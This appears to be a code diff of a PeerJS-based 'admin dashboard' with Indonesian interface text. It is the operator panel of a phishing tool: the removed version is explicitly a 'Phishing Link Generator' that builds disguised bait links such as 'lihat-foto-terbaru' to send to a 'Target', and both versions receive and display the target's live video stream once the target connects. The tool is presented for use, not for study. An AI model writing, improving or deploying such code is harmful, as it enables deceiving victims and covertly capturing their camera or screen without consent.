@@ -3,149 +3,289 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel</title>
-    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <title>Admin Dashboard</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --bg-grad: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            --card-bg: rgba(255, 255, 255, 0.1);
+            --accent: #00e676;
+            --text-main: #ffffff;
+            --text-muted: #b3b3b3;
+        }
+
         body {
-            font-family: 'Segoe UI', sans-serif;
-            background: #121212;
-            color: white;
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-grad);
+            color: var(--text-main);
             margin: 0;
-            padding: 20px;
+            height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
-            min-height: 100vh;
-        }
-        .panel {
-            background: #1e1e1e;
-            padding: 25px;
-            border-radius: 12px;
-            width: 100%;
-            max-width: 500px;
-            border: 1px solid #333;
-        }
-        h2 { color: #00e676; margin-top: 0; }
-        
-        .input-group { margin-bottom: 20px; }
-        .input-group label { display: block; margin-bottom: 8px; color: #aaa; font-size: 14px; }
-        .input-group input {
-            width: 100%;
-            padding: 10px;
-            background: #2c2c2c;
-            border: 1px solid #444;
-            color: white;
-            border-radius: 6px;
-            box-sizing: border-box;
+            justify-content: center;
+            overflow: hidden;
         }
 
-        .result-box {
-            background: #000;
+        .container {
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            transition: all 0.5s ease;
+        }
+
+        h1 {
+            font-weight: 600;
+            font-size: 24px;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        /* Kotak ID */
+        .id-wrapper {
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             padding: 15px;
-            border-radius: 6px;
-            border: 1px dashed #444;
-            word-break: break-all;
-            font-family: monospace;
-            font-size: 13px;
-            color: #00e676;
-            margin-bottom: 10px;
+            border-radius: 16px;
+            cursor: pointer;
+            position: relative;
+            transition: transform 0.2s, background 0.2s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
-        .btn {
-            background: #00e676;
-            color: #000;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
+        .id-wrapper:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
         }
-        .btn:hover { background: #00c853; }
+
+        .id-wrapper:active {
+            transform: scale(0.98);
+        }
+
+        #my-peer-id {
+            font-family: 'Courier New', monospace;
+            font-size: 20px;
+            color: #ffeb3b;
+            letter-spacing: 1px;
+            user-select: all;
+            font-weight: bold;
+        }
+
+        .copy-icon {
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-left: 10px;
+            opacity: 0.7;
+        }
+
+        /* Status Bar */
+        .status {
+            margin-top: 20px;
+            font-size: 13px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            min-height: 20px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            background-color: #555;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
+        .dot.error { background-color: #ff4444; }
 
         #remote-video {
             width: 100%;
-            border: 2px solid #00e676;
-            border-radius: 8px;
+            max-width: 800px;
+            height: auto;
+            border-radius: 12px;
             margin-top: 20px;
-            display: none;
             background: #000;
+            display: none;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            border: 1px solid #333;
         }
-        .status { margin-top: 10px; font-size: 12px; color: #888; text-align: center; }
+
+        /* Toast Notification */
+        #toast {
+            visibility: hidden;
+            min-width: 200px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 50px;
+            padding: 12px 24px;
+            position: fixed;
+            z-index: 1000;
+            bottom: 30px;
+            font-size: 14px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            opacity: 0;
+            transition: opacity 0.3s, bottom 0.3s;
+            border: 1px solid #444;
+        }
+
+        #toast.show {
+            visibility: visible;
+            opacity: 1;
+            bottom: 50px;
+        }
+
+        /* Overlay Reset (Saat Error Parah) */
+        #resetOverlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s;
+        }
+        #resetOverlay.active { opacity: 1; pointer-events: all; }
+        .reset-loader { width: 30px; height: 30px; border: 3px solid #fff; border-top-color: transparent; border-radius: 50%; animation: spin 1s infinite; margin-bottom: 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
     </style>
 </head>
 <body>
 
-    <div class="panel">
-        <h2>Phishing Link Generator</h2>
-        
-        <div class="input-group">
-            <label>Custom Link Name (Tanpa .html):</label>
-            <input type="text" id="customName" value="lihat-foto-terbaru" placeholder="Contoh: claim-hadiah">
+    <div class="container" id="mainContainer">
+        <h1>ADMIN DASHBOARD</h1>
+        <p class="subtitle">Salin ID unik ini untuk Target</p>
+
+        <div class="id-wrapper" id="copyBtn">
+            <span id="my-peer-id">Memuat...</span>
+            <span class="copy-icon">📋 Salin</span>
         </div>
 
-        <div class="input-group">
-            <label>Link Hasil (Kirim ke Target):</label>
-            <div class="result-box" id="finalLink">Generating...</div>
-            <button class="btn" onclick="updateLink()">Update Link</button>
-            <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="copyLink()">Salin Link</button>
+        <div class="status">
+            <span class="dot" id="statusDot"></span>
+            <span id="statusText">Menunggu koneksi server...</span>
         </div>
-
-        <div class="status" id="statusText">Menunggu ID Admin...</div>
     </div>
 
-    <div class="panel" style="margin-top: 20px; display:none;" id="videoPanel">
-        <video id="remote-video" autoplay playsinline></video>
+    <!-- Video -->
+    <video id="remote-video" autoplay playsinline></video>
+
+    <!-- Toast -->
+    <div id="toast">ID Berhasil Disalin!</div>
+
+    <!-- Overlay Auto Reset -->
+    <div id="resetOverlay">
+        <div class="reset-loader"></div>
+        <p>Terjadi kesalah koneksi. Mereset ID...</p>
     </div>
 
 <script>
-    const peer = new Peer(null, { debug: 1 });
-    const linkDisplay = document.getElementById('finalLink');
+    const idDisplay = document.getElementById('my-peer-id');
     const statusText = document.getElementById('statusText');
-    const customInput = document.getElementById('customName');
-    const videoPanel = document.getElementById('videoPanel');
-    const video = document.getElementById('remote-video');
+    const statusDot = document.getElementById('statusDot');
+    const remoteVideo = document.getElementById('remote-video');
+    const mainContainer = document.getElementById('mainContainer');
+    const resetOverlay = document.getElementById('resetOverlay');
     
-    let myID = "";
+    // Cek ID tersimpan
+    let storedId = localStorage.getItem('my_admin_peer_id');
+    let finalId = storedId ? storedId : null; 
+
+    const peer = new Peer(finalId, { debug: 2 });
 
     peer.on('open', (id) => {
-        myID = id;
-        statusText.innerText = "Admin ID Ready: " + id;
-        updateLink(); // Generate link awal
+        idDisplay.innerText = id;
+        statusText.innerText = "Siap menerima koneksi.";
+        statusDot.classList.add('active');
+        
+        // Pastikan ID tersimpan
+        localStorage.setItem('my_admin_peer_id', id);
     });
 
-    // Fungsi membuat link custom
-    function updateLink() {
-        const customName = customInput.value.trim().replace(/\s+/g, '-'); // Ganti spasi jadi strip
-        const basePath = window.location.href.replace('admin.html', '');
-        
-        // Format: domain.com/nama-custom.html#ID_ADMIN
-        // Kita tambahkan .html palsu agar terlihat seperti file statis
-        const fakeUrl = `${basePath}${customName}.html`;
-        
-        // ID Admin dimasukkan ke dalam Hash (#)
-        const generatedLink = `${fakeUrl}#${myID}`;
-        
-        linkDisplay.innerText = generatedLink;
-    }
-
-    function copyLink() {
-        navigator.clipboard.writeText(linkDisplay.innerText).then(() => {
-            alert("Link Berhasil Disalin!");
-        });
-    }
-
-    // Terima Call dari Target
     peer.on('call', (call) => {
-        statusText.innerText = "Target Terhubung!";
-        call.answer();
+        statusText.innerText = "Target terhubung...";
+        
+        // Sembunyikan UI Admin agar fokus ke video
+        mainContainer.style.display = 'none';
+        remoteVideo.style.display = 'block';
+
+        call.answer(); 
+
         call.on('stream', (remoteStream) => {
-            video.srcObject = remoteStream;
-            video.play();
-            videoPanel.style.display = 'block';
-            document.querySelector('.panel').style.display = 'none'; // Sembunyikan kontrol
+            remoteVideo.srcObject = remoteStream;
+            statusText.innerText = "LIVE CONNECTED";
+        });
+
+        call.on('close', () => {
+            // Jika koneksi putus saat live, kita refresh saja untuk mereset state
+            // ID tetap sama, karena putus koneksi bukan berarti ID rusak.
+            location.reload(); 
         });
     });
+
+    peer.on('error', (err) => {
+        console.error(err);
+        
+        // Logika Auto-Reset HANYA jika error yang membuat ID tidak valid
+        // Error types: 'peer-unavailable', 'disconnected', 'unavailable-id'
+        const criticalErrors = ['peer-unavailable', 'unavailable-id', 'server-error', 'network'];
+        
+        if (criticalErrors.includes(err.type)) {
+            triggerAutoReset();
+        } else {
+            statusText.innerText = "Error Sementara: " + err.type;
+            statusDot.classList.remove('active');
+            statusDot.classList.add('error');
+        }
+    });
+
+    function triggerAutoReset() {
+        statusText.innerText = "Gagal memuat ID lama. Mengganti ID baru...";
+        statusDot.classList.add('error');
+        
+        // Tampilkan overlay
+        resetOverlay.classList.add('active');
+
+        // Hapus ID yang error
+        localStorage.removeItem('my_admin_peer_id');
+
+        // Tunggu 2 detik lalu refresh agar user baca dulu
+        setTimeout(() => {
+            location.reload();
+        }, 2000);
+    }
+
+    // Copy Function
+    document.getElementById('copyBtn').addEventListener('click', () => {
+        const text = idDisplay.innerText;
+        if(text !== "Memuat..." && text !== "Error") {
+            navigator.clipboard.writeText(text);
+            showToast();
+        }
+    });
+
+    function showToast() {
+        const toast = document.getElementById("toast");
+        toast.className = "show";
+        setTimeout(function(){ toast.className = toast.className.replace("show", ""); }, 3000);
+    }
 </script>
 
 </body>
